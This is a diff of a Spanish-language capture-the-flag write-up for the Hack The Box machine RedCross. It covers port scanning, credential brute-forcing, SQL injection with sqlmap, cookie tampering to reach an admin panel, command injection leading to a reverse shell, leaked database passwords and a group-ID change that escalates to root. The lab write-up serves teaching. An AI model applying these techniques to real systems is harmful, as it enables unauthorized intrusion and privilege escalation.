@@ -7,6 +7,8 @@ categories: ["htb", "pentesting"]
 
 ---
 
+z
+
 <!--more-->
 
 # Machine info
@@ -27,7 +29,7 @@ Iniciamos por ejecutar un `nmap` y un `masscan` para identificar puertos udp y t
 
 ```text
 root@laptop:~# nmap -sS -p- -n --open -v 10.10.10.113
-Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-17 19:04 CST
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-17 16:47 CST
 Initiating Ping Scan at 19:04
 Scanning 10.10.10.113 [4 ports]
 Completed Ping Scan at 19:04, 0.22s elapsed (1 total hosts)
@@ -36,6 +38,21 @@ Scanning 10.10.10.113 [65535 ports]
 Discovered open port 80/tcp on 10.10.10.113
 Discovered open port 443/tcp on 10.10.10.113
 Discovered open port 22/tcp on 10.10.10.113
+Increasing send delay for 10.10.10.113 from 0 to 5 due to 11 out of 29 dropped probes since last increase.
+SYN Stealth Scan Timing: About 3.31% done; ETC: 16:54 (0:15:05 remaining)
+Increasing send delay for 10.10.10.113 from 5 to 10 due to 11 out of 22 dropped probes since last increase.
+Increasing send delay for 10.10.10.113 from 10 to 20 due to 11 out of 24 dropped probes since last increase.
+SYN Stealth Scan Timing: About 3.94% done; ETC: 17:04 (0:24:46 remaining)
+Increasing send delay for 10.10.10.113 from 20 to 40 due to 11 out of 23 dropped probes since last increase.
+SYN Stealth Scan Timing: About 4.34% done; ETC: 17:14 (0:33:24 remaining)
+Increasing send delay for 10.10.10.113 from 40 to 80 due to 11 out of 25 dropped probes since last increase.
+Increasing send delay for 10.10.10.113 from 80 to 160 due to 11 out of 23 dropped probes since last increase.
+SYN Stealth Scan Timing: About 4.56% done; ETC: 17:23 (0:42:11 remaining)
+Increasing send delay for 10.10.10.113 from 160 to 320 due to 11 out of 26 dropped probes since last increase.
+SYN Stealth Scan Timing: About 4.66% done; ETC: 17:33 (0:51:29 remaining)
+SYN Stealth Scan Timing: About 4.72% done; ETC: 17:43 (1:00:50 remaining)
+SYN Stealth Scan Timing: About 4.79% done; ETC: 17:52 (1:09:54 remaining)
+SYN Stealth Scan Timing: About 4.86% done; ETC: 18:01 (1:18:43 remaining)
 ...
 FOREVER
 ```
@@ -46,7 +63,9 @@ FOREVER
 - `-n` para no ejecutar resoluciones
 - `-v` para modo *verboso*
 
-Como pudimos ver con `nmap`, el escaneo demoraba mucho. Con los 3 primeros puertos descubiertos, realicemos un check contra `masscan`:
+Como pudimos ver con `nmap`, el escaneo demoraba mucho e incrementaba el tiempo de envío conforme encontraba drops. Podemos obtener un mejor resultado si agregamos `--max-retries 1 --max-scan-delay 1000ms`, para limitar un reintento por prueba y un segundo de tiempo de espera por prueba.
+
+Por el momento, tomemos como referencia los resultados, los 3 primeros puertos descubiertos, y continuemos con el doblecheck usando `masscan`:
 
 ```text
 root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.113
@@ -68,18 +87,86 @@ Como podemos ver los puertos son los mismos, por lo que iniciamos por identifica
 
 # Services Identification
 
-Lanzamos `nmap` con los parámetros habituales para la identificación (\-sC \-sV):
+Lanzamos `nmap` con los parámetros habituales para la identificación (\-sC \-sV) y le sumamos un timeout a los scripts NSE de 10:
 
 ```text
+root@laptop:~# nmap -sC -sV -p22,80,443 -n -v 10.10.10.113 --script-timeout 10
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-17 18:31 CDT
+NSE: Loaded 148 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 18:31
+Completed NSE at 18:31, 0.00s elapsed
+Initiating NSE at 18:31
+Completed NSE at 18:31, 0.00s elapsed
+Initiating Ping Scan at 18:31
+Scanning 10.10.10.113 [4 ports]
+Completed Ping Scan at 18:31, 0.23s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 18:31
+Scanning 10.10.10.113 [3 ports]
+Discovered open port 22/tcp on 10.10.10.113
+Discovered open port 443/tcp on 10.10.10.113
+Discovered open port 80/tcp on 10.10.10.113
+Completed SYN Stealth Scan at 18:31, 0.22s elapsed (3 total ports)
+Initiating Service scan at 18:31
+Scanning 3 services on 10.10.10.113
+Completed Service scan at 18:31, 12.90s elapsed (3 services on 1 host)
+NSE: Script scanning 10.10.10.113.
+Initiating NSE at 18:31
+Completed NSE at 18:31, 10.31s elapsed
+Initiating NSE at 18:31
+Completed NSE at 18:31, 0.01s elapsed
+Nmap scan report for 10.10.10.113
+Host is up (0.11s latency).
 
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
+| ssh-hostkey:
+|   2048 67:d3:85:f8:ee:b8:06:23:59:d7:75:8e:a2:37:d0:a6 (RSA)
+|   256 89:b4:65:27:1f:93:72:1a:bc:e3:22:70:90:db:35:96 (ECDSA)
+|_  256 66:bd:a1:1c:32:74:32:e2:e6:64:e8:a5:25:1b:4d:67 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.25
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Did not follow redirect to https://intra.redcross.htb/
+443/tcp open  ssl/http Apache httpd 2.4.25
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Did not follow redirect to https://intra.redcross.htb/
+| ssl-cert: Subject: commonName=intra.redcross.htb/organizationName=Red Cross International/stateOrProvinceName=NY/countryName=US
+| Issuer: commonName=intra.redcross.htb/organizationName=Red Cross International/stateOrProvinceName=NY/countryName=US
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2018-06-03T19:46:58
+| Not valid after:  2021-02-27T19:46:58
+| MD5:   f95b 6897 247d ca2f 3da7 6756 1046 16f1
+|_SHA-1: e86e e827 6ddd b483 7f86 c59b 2995 002c 77cc fcea
+|_ssl-date: TLS randomness does not represent time
+Service Info: Host: redcross.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+Initiating NSE at 18:31
+Completed NSE at 18:31, 0.00s elapsed
+Initiating NSE at 18:31
+Completed NSE at 18:31, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 24.28 seconds
+           Raw packets sent: 7 (284B) | Rcvd: 4 (160B)
 ```
 
 - `-sC` para que ejecute los scripts safe-discovery de nse
 - `-sV` para que me traiga el banner del puerto
 - `-p22,80,443` para unicamente los puertos TCP/22, TCP/80 y TCP/443
 - `-n` para no ejecutar resoluciones
+- `-v` para modo *verboso*
+- `--nse-timeout 10` para limitar las pruebas de tiempo y no perdernos en el delay a nivel de script como antes con scan.
 
-# HTTP
+Como podemos ver, tenemos 2 servicios HTTP (TCP/80) y HTTPS (TCP/443) haciendo referencia a un host intra.redcross.htb, y un servicio de SSH expuesto. Por las versiones de APACHE y OpenSSH no encontramos exploits directos, por lo que pasemos a analizar los servicios.
+
+# Explorando el servicio HTTP (TCP/80)
 
 Comenzamos por explorar el servicio web sobre el puerto TCP/80:
 
@@ -105,7 +192,7 @@ Server: Apache/2.4.25 (Debian)
 </body></html>
 ```
 
-Lo primero que recibimos es un código 301 que nos redirige hacia `intra.redcross.htb` indicándonos la existencia de posibles vhosts sobre el servidor.
+Lo primero que recibimos es un código 301 que nos redirige hacia `intra.redcross.htb` indicándonos la existencia de posibles vhosts sobre el servidor. Importante que también cambiamos de http (tcp/80) a https (tcp/443), pero de momento no ajustemos el protocolo y agreguemos el header de Host.
 
 Hagamos la prueba sobre intra.redcross.htb:
 
@@ -153,11 +240,32 @@ Set-Cookie: PHPSESSID=aa8a92c5mkbstk7b3t01qt37o5; path=/
 <a href=/><table border=0 width=90%><tr><td colspan=2><table border=0><tr><td rowspan=2 align='right'><img src='/images/logo.png' width='50%'></td><td valign='bottom'><h2>RedCross Messaging Intranet</h2></td></tr><tr><td valign='top'><h3>Employees & providers portal</h3></td></tr></table></td><td><p style='font-size:75%'>not logged in</p><form action='/?page=login' method='POST'><input type='submit' name='action' value='go login'></form></td></tr></table></a>
 ```
 
-Tenemos ahora un *302*, un `location` de `/?page=login` y un portal de ingreso para empleados "intranet".
+Tenemos ahora un *302*, un `location` de `/?page=login` y un portal de ingreso para empleados "intranet". Hamos un request en esta pagina:
+
+```
+xbytemx@laptop:~/htb/redcross$ http --verify no https://10.10.10.113/?page=login Host:intra.redcross.htb
+HTTP/1.1 200 OK
+Cache-Control: no-store, no-cache, must-revalidate
+Connection: Keep-Alive
+Content-Encoding: gzip
+Content-Length: 485
+Content-Type: text/html; charset=UTF-8
+Date: Mon, 18 Mar 2019 01:13:45 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=5, max=100
+Pragma: no-cache
+Server: Apache/2.4.25 (Debian)
+Set-Cookie: PHPSESSID=snmneeed8pfkdpsv3icgknd5v7; path=/
+Vary: Accept-Encoding
+
+<a href=/><table border=0 width=90%><tr><td colspan=2><table border=0><tr><td rowspan=2 align='right'><img src='/images/logo.png' width='50%'></td><td valign='bottom'><h2>RedCross Messaging Intranet</h2></td></tr><tr><td valign='top'><h3>Employees & providers portal</h3></td></tr></table></td><td><p style='font-size:75%'>not logged in</p><form action='/?page=login' method='POST'><input type='submit' name='action' value='go login'></form></td></tr></table></a><center><table><form method='POST' action='/pages/actions.php'><tr><td align='right'>User</td><td><input type='text' name='user'></input></td></tr><tr><td align='right'>Password</td><td><input type='password' name='pass'></input></td></tr><tr><td colspan=2 align='right'><input type='submit' value='Login'></td></tr></table><input type='hidden' name='action' value='login'></form><p>Please contact with our staff via <a href='?page=contact'>contact form</a> to request your access credentials.</p></center><br><br><center><p>Web messaging system 0.3b</p></center>
+```
 
 ![intra root](/img/htb-redcross/http-intra-root.png)
 
-Probemos con las credenciales tradicionales de admin/admin:
+Agregaremos el fqdn 'intra.redcross.htb' en nuestro archivo /etc/hosts.
+
+Podemos ver que tenemos un form hacia `/pages/actions.php` que recibe el user, pass y action. Mandemos una prueba via POST con las credenciales tradicionales de admin/admin:
 
 ```html
 xbytemx@laptop:~/htb/redcross$ http --verify no -f POST "https://intra.redcross.htb/pages/actions.php" user=admin pass=admin submit=Login action=login
@@ -207,7 +315,7 @@ Fatal exception: Pycurl error 7: Failed to connect to intra.redcross.htb port 44
 
 Como podemos ver después de un par de intentos (39), el servidor empieza a rechazar las conexiones.
 
-Reduciendo la prueba a valores identicos (mismo nombre y contraseña), logre adivinar una cuenta para acceder:
+Reduciendo la prueba a valores idénticos (mismo nombre y contraseña), logre adivinar una cuenta para acceder:
 
 ```
 xbytemx@laptop:~/htb/redcross$ wfuzz -c --hh 11 -z file,/home/xbytemx/git/SecLists/Usernames/top-usernames-shortlist.txt -d 'user=FUZZ&pass=FUZZ&submit=Login&action=login' https://intra.redcross.htb/pages/actions.php
@@ -239,7 +347,7 @@ Ya tenemos unas credenciales validas para intra.redcross.htb.
 
 # Searching for anothers subdomains
 
-Como recodaremos, al realizar una peticion directamente al servidor, nos mando hacia intra, pero ¿y si existen mas vhosts?
+Como recodaremos, al realizar una petición directamente al servidor, nos mando hacia intra, pero ¿y si existen mas vhosts?
 
 Probemos con vhostscan:
 
@@ -277,7 +385,7 @@ Probemos con vhostscan:
 - `-b redcross.htb` para indicar el dominio raiz
 - `-p 443 --ssl` para indicar que estaremos buscando sobre HTTPS
 
-Hemos encontrado otro vhosts, en este caso se trata de `admin.redcross.htb`:
+Hemos encontrado otro vhosts, en este caso se trata de `admin.redcross.htb`, el cual agregamos tambien a nuestro archivo `/etc/hosts`:
 
 ```html
 xbytemx@laptop:~/htb/redcross$ http --verify no "https://admin.redcross.htb"
@@ -299,14 +407,14 @@ Set-Cookie: PHPSESSID=1ec3ba5cg3i5rhmif3ii0foa30; path=/
 
 ![admin root](/img/htb-redcross/http-admin-root.png)
 
-Necesitamos nuevamente algunas credenciales.
+Necesitamos nuevamente algunas credenciales, pero vemos una estructura muy familiar (Location: `/?page=login`).
 
 # Login on intra
 
 Ahora que hemos identificado unas credenciales para intra, validemos el acceso:
 
 ```
-xbytemx@laptop:~/htb/redcross$ http --verify no -f POST "https://intra.redcross.htb/pages/actions.php" user=guest pass=guest submit=Login action=login
+xbytemx@laptop:~/htb/redcross$ http --verify no -f POST "https://intra.redcross.htb/pages/actions.php" user=guest pass=guest action=login action=login
 HTTP/1.1 200 OK
 Cache-Control: no-store, no-cache, must-revalidate
 Connection: Keep-Alive
@@ -328,12 +436,31 @@ Checking provided credentials...
 
 ```
 
+Siguiendo el redirect que se genera después, tendremos una pantalla como la siguiente:
+
 ![intra login](/img/htb-redcross/http-intra-login.png)
 
+```
+xbytemx@laptop:~$ http --verify no https://intra.redcross.htb/?page=app "Cookie: PHPSESSID=le7n8htqei4pg268v1bm1vqtq1;LANG=EN_US;SINCE=1552972200;LIMIT=10;DOMAIN=intra;"
+HTTP/1.1 200 OK
+Cache-Control: no-store, no-cache, must-revalidate
+Connection: Keep-Alive
+Content-Encoding: gzip
+Content-Length: 595
+Content-Type: text/html; charset=UTF-8
+Date: Tue, 19 Mar 2019 05:11:20 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=5, max=100
+Pragma: no-cache
+Server: Apache/2.4.25 (Debian)
+Vary: Accept-Encoding
+
+<a href=/><table border=0 width=90%><tr><td colspan=2><table border=0><tr><td rowspan=2 align='right'><img src='/images/logo.png' width='50%'></td><td valign='bottom'><h2>RedCross Messaging Intranet</h2></td></tr><tr><td valign='top'><h3>Employees & providers portal</h3></td></tr></table></td><td><p style='font-size:75%'>guest</p><form action='/pages/actions.php' method='POST'><input type='submit' name='action' value='end session'></form></td></tr></table></a><center><table border=0 width=60% cellpadding=5><tr><td colspan=2><h3><b>Guest Account Info [1]</b></h3></td></tr><tr><td>From: admin (uid 1)</td><td align='right'>To: guest (uid 5)</td></tr><tr><td colspan=2><p>You're granted with a low privilege access while we're processing your credentials request. Our messaging system still in beta status. Please report if you find any incidence.</p></td></tr></table></center><center><table border=0 width=60% cellspacing=5><tr><td align=right><form method='GET' action='/'>UserID&nbsp<input type='text' size=1 name='o' >&nbsp<input type='submit' value='filter'><input type=hidden name='page' value='app'></form></td></tr></table></center><br><br><center><p>Web messaging system 0.3b</p></center>
+```
 
 # SQLi
 
-Después de explorar un poco el home, me di cuenta de la exposición de algunas variables, por lo que intente un sqli con algunos parámetros de evasión:
+Después de explorar un poco el home (app), me di cuenta de la exposición de algunas variables, por lo que intente un sqli con algunos parámetros de evasión usando `sqlmap`:
 
 ```
 xbytemx@laptop:~/htb/redcross$ sqlmap -u "https://intra.redcross.htb/?o=1&page=app" --cookie="PHPSESSID=le7n8htqei4pg268v1bm1vqtq1; LANG=EN_US; SINCE=1552972200; LIMIT=10; DOMAIN=intra;" --tamper=space2comment --random-agent
@@ -514,7 +641,7 @@ Table: requests
 
 ```
 
-Bastante información, de la cual tenemos hashes bcrypt y varias notas del subdomain admin que descubrimos anteriormente. No pudimos conseguir ninguna credencial mas que guest, pero había un detalle interesante sobre nuestra cookie que devolvía intra al ingresar, la variable **DOMAIN**.
+Bastante información, de la cual tenemos hashes bcrypt (tardaremos mucho para romperlas) y varias notas del subdomain admin que descubrimos anteriormente. No pudimos conseguir ninguna credencial mas que guest, pero había un detalle interesante sobre nuestra cookie que devolvía intra al ingresar, la variable **DOMAIN**. Probemos si el manejo de autenticación esta roto.
 
 # Login on admin
 
@@ -524,7 +651,9 @@ Primero obtengamos una cookie de intra:
 
 ```
 xbytemx@laptop:~/htb/redcross$ http --verify no -f POST "https://intra.redcross.htb/pages/actions.php" user=guest pass=guest submit=Login action=login
-...
+
+<omitiendo>
+
 PHPSESSID=5a0o7947pk2gb11m6acglej5i6; LANG=EN_US; SINCE=1555227715; LIMIT=10; DOMAIN=intra;
 ```
 
@@ -546,11 +675,13 @@ Server: Apache/2.4.25 (Debian)
 
 ```
 
+El portal que tenemos y debemos ver es el siguiente:
+
 ![admin login](/img/htb-redcross/http-admin-login.png)
 
 # CPanel
 
-Vallamos al cpanel de admin:
+Visitemos el cpanel de admin:
 
 ```
 xbytemx@laptop:~/htb/redcross$ http --verify no "https://admin.redcross.htb/?page=cpanel" "Cookie:PHPSESSID=5a0o7947pk2gb11m6acglej5i6; LANG=EN_US; SINCE=1555227715; LIMIT=10; DOMAIN=admin;"
@@ -570,7 +701,7 @@ Vary: Accept-Encoding
 
 ![admin cpanel](/img/htb-redcross/http-admin-cpanel.png)
 
-Tenemos una administración de usuarios y de reglas de firewall. Comencemos por conocer users:
+Tenemos una administración de usuarios y de reglas de firewall. Comencemos por conocer **User Management** (users):
 
 ```html
 xbytemx@laptop:~/htb/redcross$ http --verify=no "https://admin.redcross.htb/?page=users" "Cookie:PHPSESSID=oiuslv12i7j2urs7u86etj3bq6; LANG=EN_US; SINCE=1553146196; LIMIT=10; DOMAIN=admin;" HTTP/1.1 200 OK
@@ -633,11 +764,11 @@ $ id
 uid=2026 gid=1001(associates) groups=1001(associates)
 ```
 
-Pronto nos daremos cuenta de lo limitada que es esta shell y que no cuenta con muchas herramientas que nos permitan escalar directamente a algún otro usuario.
+Pronto nos daremos cuenta de lo limitada que es esta shell y que no cuenta con muchas herramientas que nos permitan escalar directamente a algún otro usuario o inclusive salir, al menos yo no encontré la manera.
 
 # RCE
 
-Veamos ahora que podemos hacer desde firewall:
+Veamos ahora que podemos hacer desde **Network Access** (firewall):
 
 ```html
 xbytemx@laptop:~/htb/redcross$ http --verify no https://admin.redcross.htb/?page=firewall Cookie:"PHPSESSID=79cdhgjto42ab714987f6258c1; LANG=EN_US; SINCE=1555294885; LIMIT=10; DOMAIN=admin;"HTTP/1.1 200 OK
@@ -695,7 +826,7 @@ PING 10.10.14.84 (10.10.14.84) 56(84) bytes of data.
 
 ```
 
-Habiendo identificado que podemos realizar un command injection desde esta parte, prepare el siguiente script de python para generar una reverse shell:
+Habiendo identificado que podemos realizar un command injection desde el parametro **ip**, prepare el siguiente script de python para generar una reverse shell cada que necesite conectarme:
 
 ```python
 import requests,netifaces
@@ -799,7 +930,7 @@ www-data@redcross:/var/www/html$
 
 Hemos encontrado unas credenciales de mysql, misma que accedimos por el SQLi.
 
-Después de continuar analizando las aplicaciones, encontraremos que hay otra conexión a otra base de datos, a postgresql:
+Después de continuar analizando las aplicaciones, encontraremos que hay otra conexión a otra base de datos, una a postgresql que usaba la aplicación de *admin* para el control de red:
 
 ```php
 www-data@redcross:/var/www/html$ cat admin/pages/actions.php
@@ -951,6 +1082,8 @@ cat * | grep pg_connect
 	$dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixnss password=fios@ew023xnw");
 ```
 
+Convirtiendo a tabla:
+
 | # | Host      | dbname   | user       | password      |
 |---|-----------|----------|------------|---------------|
 | 1 | 127.0.0.1 | redcross | www        | aXwrtUO9_aa&  |
@@ -1057,19 +1190,21 @@ select * from passwd_table;
 
 # privesc
 
-Aparece nuestro usuario `miau`, que como podemos ver pertenece a un ambiente enjaulado. En el ambiente enjaulado pertenecer a un grupo sin privilegios nos impidió realizar algunas tareas, pero ahora que tenemos acceso a la DB, podemos cambiar esa propiedad a algún grupo como sudo:
+Aparece nuestro usuario `miau`, que como recordamos pertenece a un ambiente enjaulado. Dicho ambiente enjaulado nos entregaba una shell limitada, un home donde no teníamos permisos de acercarnos al root (*/*), pero ahora que tenemos acceso a donde se encuentra estas propiedades, confiemos en que el script que se encarga de modificar la 'jaula' responda ante los cambios en la base de datos.
+
+En el ambiente enjaulado agrega a todos los usuarios nuevos al grupo limitado con *GID* 1001, el cual nos impidió realizar algunas tareas, pero ahora que tenemos acceso a la DB, podemos cambiar esa propiedad. Cambiemos esta propiedad a 0:
 
 ```
-update passwd_table set gid=27 where username='miau';
+update passwd_table set gid=0 where username='miau';
 select * from passwd_table;
  username |               passwd               | uid  | gid  | gecos |    homedir     |   shell
 ----------+------------------------------------+------+------+-------+----------------+-----------
  tricia   | $1$WFsH/kvS$5gAjMYSvbpZFNu//uMPmp. | 2018 | 1001 |       | /var/jail/home | /bin/bash
- miau     | $1$aINCdBU3$DI6tECMqjpMZ.D5c/DkpM/ | 2020 |   27 |       | /var/jail/home | /bin/bash
+ miau     | $1$aINCdBU3$DI6tECMqjpMZ.D5c/DkpM/ | 2020 |    0 |       | /var/jail/home | /bin/bash
 (2 rows)
 ```
 
-Ahora que nuestro usuario `miau` pertenece al grupo sudo, elevemos a nuestro usuario:
+Ahora hagamos un upgrade de nuestra shell y accedamos como miau:
 
 ```
 www-data@redcross:/var/www/html/admin/pages$ python -c 'import pty; pty.spawn("/bin/bash")'
@@ -1078,19 +1213,17 @@ www-data@redcross:/var/www/html/admin/pages$ su - miau
 su - miau
 Password: CCutRKf7
 
-miau@redcross:~$ sudo -s
-sudo -s
+miau@redcross:~$
+```
 
-We trust you have received the usual lecture from the local System
-Administrator. It usually boils down to these three things:
+Pero ser del grupo root no nos hace root.
 
-    #1) Respect the privacy of others.
-    #2) Think before you type.
-    #3) With great power comes great responsibility.
-
-[sudo] password for miau: CCutRKf7
-
-root@redcross:/var/jail/home# ls -lah /root
+```
+miau@redcross:~$ cat /root/root.txt /home/penelope/user.txt
+cat /root/root.txt /home/penelope/user.txt
+cat: /root/root.txt: Permission denied
+cat: /home/penelope/user.txt: Permission denied
+miau@redcross:~$ ls -lah /root
 ls -lah /root
 total 64K
 drwxr-x---  6 root root 4.0K Oct 31 12:33 .
@@ -1107,6 +1240,55 @@ drwxr-xr-x  4 root root 4.0K Jun  7  2018 .npm
 -rw-r--r--  1 root root   74 Jun  6  2018 .selected_editor
 drwx------  4 root root 4.0K Jun  3  2018 .thumbnails
 -rw-------  1 root root  13K Oct 31 12:30 .viminfo
+```
+
+Recordemos que como solo podemos editar el grupo, aunque lo cambiemos a root, no podremos leer todos los archivos donde los permisos solo sean de usuario.
+
+Pero si hay una manera en la que un usuario puede adquirir todos los poderes de otro, esto es mediante SUDO. Ahora que somos del grupo chido, veamos que hay en sudoers:
+
+```
+miau@redcross:~$ cat /etc/sudoers | grep -E 'ALL$'
+cat /etc/sudoers | grep -E 'ALL$'
+root	ALL=(ALL:ALL) ALL
+%sudo   ALL=(ALL:ALL) ALL
+```
+
+Esto significa que cualquier que pertenezca al grupo sudo, [podrá](https://www.hostinger.com/tutorials/sudo-and-the-sudoers-file/) subir a root. Ahora solo falta verificar cual es el grupo de sudo:
+
+```
+miau@redcross:~$ cat /etc/group | grep sudo
+cat /etc/group | grep sudo
+sudo:x:27:
+```
+
+Ahora si, cambiemos el grupo en la shell conectada a postgre:
+
+```
+update passwd_table set gid=27 where username='miau';
+select * from passwd_table;
+ username |               passwd               | uid  | gid  | gecos |    homedir     |   shell
+----------+------------------------------------+------+------+-------+----------------+-----------
+ tricia   | $1$WFsH/kvS$5gAjMYSvbpZFNu//uMPmp. | 2018 | 1001 |       | /var/jail/home | /bin/bash
+ miau     | $1$aINCdBU3$DI6tECMqjpMZ.D5c/DkpM/ | 2020 |   27 |       | /var/jail/home | /bin/bash
+(2 rows)
+```
+
+Ahora que nuestro usuario `miau` pertenece al grupo sudo, elevemos a nuestro usuario:
+
+```
+miau@redcross:~$ sudo -s
+sudo -s
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for miau: CCutRKf7
+
+root@redcross:/var/jail/home#
 ```
 
 # cat user.txt root.txt
